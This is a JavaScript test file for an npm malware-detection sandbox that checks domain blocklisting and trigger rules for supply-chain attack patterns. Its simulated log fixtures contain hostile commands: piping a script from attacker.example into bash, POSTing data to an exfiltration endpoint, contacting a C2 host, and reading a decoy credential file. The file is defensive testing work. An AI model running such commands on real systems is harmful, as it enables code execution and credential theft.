'use strict';

const { test, assert } = require('../test-utils');
const {
  evaluateSandboxTrigger
} = require('../../src/sandbox/compound-triggers.js');
const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');
const { classifyDomain } = require('../../src/sandbox/network-allowlist.js');

function runSandbox2026PipelineTests() {
  console.log('\n=== SANDBOX 2026 PIPELINE INTEGRATION TESTS ===\n');

  test('PIPELINE-2026: Axios C2 sfrclak.com classifies blacklisted', () => {
    assert(classifyDomain('sfrclak.com') === 'blacklisted', 'sfrclak.com must be blacklisted');
    assert(classifyDomain('api.sfrclak.com') === 'blacklisted', 'subdomain must inherit');
  });

  test('PIPELINE-2026: Solana RPC classifies blockchain', () => {
    assert(classifyDomain('mainnet-beta.solana.com') === 'blockchain', 'Solana mainnet must be blockchain');
    assert(classifyDomain('rpc.ankr.com') === 'blockchain', 'Ankr RPC must be blockchain');
    assert(classifyDomain('mainnet.infura.io') === 'blockchain', 'Infura must be blockchain');
  });

  test('PIPELINE-2026: dynamic DNS abused domains classify blacklisted', () => {
    assert(classifyDomain('attacker.duckdns.org') === 'blacklisted', 'duckdns must be blacklisted');
    assert(classifyDomain('xyz.no-ip.com') === 'blacklisted', 'no-ip.com must be blacklisted');
  });

  test('PIPELINE-2026: pastebin family classifies blacklisted', () => {
    assert(classifyDomain('pastebin.com') === 'blacklisted', 'pastebin.com must be blacklisted');
    assert(classifyDomain('hastebin.com') === 'blacklisted', 'hastebin must be blacklisted');
    assert(classifyDomain('npoint.io') === 'blacklisted', 'npoint.io (Robert King campaign) must be blacklisted');
  });

  test('PIPELINE-2026: legitimate domains stay safe', () => {
    assert(classifyDomain('registry.npmjs.org') === 'safe', 'npm registry safe');
    assert(classifyDomain('github.com') === 'safe', 'github.com safe');
    assert(classifyDomain('googleapis.com') === 'safe', 'googleapis safe');
  });

  test('PIPELINE-2026: Shai-Hulud-like static threats trigger sandbox + analyzer reports CRITICAL', () => {
    // Step 1: static layer detects Shai-Hulud pattern
    const threats = [
      { type: 'lifecycle_added_critical', severity: 'CRITICAL', file: 'package.json' },
      { type: 'credential_regex_harvest', severity: 'HIGH', file: 'index.js' }
    ];
    const trigger = evaluateSandboxTrigger(threats, 25);
    assert(trigger.shouldRun, 'Shai-Hulud static signals must trigger sandbox');
    assert(trigger.compound === 'lifecycle_install_chain', 'Compound must be lifecycle_install_chain');

    // Step 2: sandbox preload log shows honey READ + outbound to attacker
    const preloadLog = [
      '[PRELOAD] FS_READ: SENSITIVE /home/sandboxuser/.npmrc-decoy (t+50ms)',
      '[PRELOAD] FS_WRITE: /home/sandboxuser/.bashrc (t+100ms)',
      '[PRELOAD] EXEC: spawn: node setup.js (t+150ms)',
      '[PRELOAD] EXEC: DANGEROUS spawn: curl -sL https://attacker.example/payload | bash (t+200ms)',
      '[PRELOAD] MOCK_HTTP: https POST attacker.example /exfil (t+250ms)'
    ].join('\n') + '\n';
    const analysis = analyzePreloadLog(preloadLog);

    const types = analysis.findings.map(f => f.type);
    assert(types.includes('sandbox_honey_read'), 'Analyzer must report honey_read');
    assert(types.includes('sandbox_persistence_write'), 'Analyzer must report persistence_write');
    assert(types.includes('sandbox_execve_chain_depth'), 'Analyzer must report execve_chain_depth');
    const honey = analysis.findings.find(f => f.type === 'sandbox_honey_read');
    assert(honey.severity === 'CRITICAL', 'honey_read must be CRITICAL when correlated with non-registry outbound');
  });

  test('PIPELINE-2026: Axios 2026 OrDeR_7077 pattern triggers + analyzer reports runtime deobf', () => {
    const threats = [
      { type: 'anti_forensic_xor_autodelete', severity: 'CRITICAL', file: 'setup.js' },
      { type: 'dangerous_call_function', severity: 'HIGH', file: 'setup.js' }
    ];
    const trigger = evaluateSandboxTrigger(threats, 30);
    assert(trigger.shouldRun, 'Axios 2026 must trigger sandbox');
    assert(trigger.compound === 'decrypt_then_execute', 'Compound must be decrypt_then_execute');

    const preloadLog = [
      '[PRELOAD] NEW_FUNCTION: bodyLen=8192 argsCount=0 bodyStart=var _0xab=function() (t+100ms)',
      '[PRELOAD] EXEC: DANGEROUS spawn: curl -X POST https://sfrclak.com:8000/c2 (t+200ms)'
    ].join('\n') + '\n';
    const analysis = analyzePreloadLog(preloadLog);
    const deobf = analysis.findings.find(f => f.type === 'sandbox_runtime_deobfuscation_executed');
    assert(deobf, 'Analyzer must report runtime_deobfuscation_executed');
  });

  test('PIPELINE-2026: GlassWorm pattern triggers invisible_blockchain compound', () => {
    const threats = [
      { type: 'unicode_variation_decoder', severity: 'CRITICAL', file: 'extension.js' },
      { type: 'blockchain_rpc_endpoint', severity: 'MEDIUM', file: 'extension.js' }
    ];
    const trigger = evaluateSandboxTrigger(threats, 22);
    assert(trigger.shouldRun, 'GlassWorm must trigger sandbox');
    assert(trigger.compound === 'invisible_blockchain', 'Compound must be invisible_blockchain');
    // The Solana mainnet domain must classify as 'blockchain' so the analyzer
    // can correlate with the static unicode_variation_decoder finding.
    assert(classifyDomain('mainnet-beta.solana.com') === 'blockchain', 'Solana mainnet must be blockchain class');
  });

  test('PIPELINE-2026: CanisterWorm pattern triggers + analyzer reports npm_self_invoke', () => {
    const threats = [
      { type: 'npm_token_steal', severity: 'CRITICAL', file: 'index.js' },
      { type: 'remote_code_load', severity: 'HIGH', file: 'index.js' }
    ];
    const trigger = evaluateSandboxTrigger(threats, 30);
    assert(trigger.shouldRun, 'CanisterWorm must trigger sandbox');
    assert(trigger.compound === 'npm_token_self_use', 'Compound must be npm_token_self_use');

    const preloadLog = '[PRELOAD] EXEC: spawn: npm publish ./victim-package (t+500ms)\n';
    const analysis = analyzePreloadLog(preloadLog);
    const f = analysis.findings.find(x => x.type === 'sandbox_npm_self_invoke');
    assert(f, 'Analyzer must report npm_self_invoke');
    assert(f.severity === 'CRITICAL', 'npm_self_invoke must be CRITICAL');
  });

  test('PIPELINE-2026: benign popular package does not trigger sandbox', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', file: 'lib/utils.js' },
      { type: 'github_api_call', severity: 'HIGH', file: 'lib/api.js' },
      { type: 'dangerous_call_exec', severity: 'MEDIUM', file: 'lib/cli.js' }
    ];
    const trigger = evaluateSandboxTrigger(threats, 25);
    assert(!trigger.shouldRun, 'Benign signals must not trigger any compound');
  });
}

module.exports = { runSandbox2026PipelineTests };
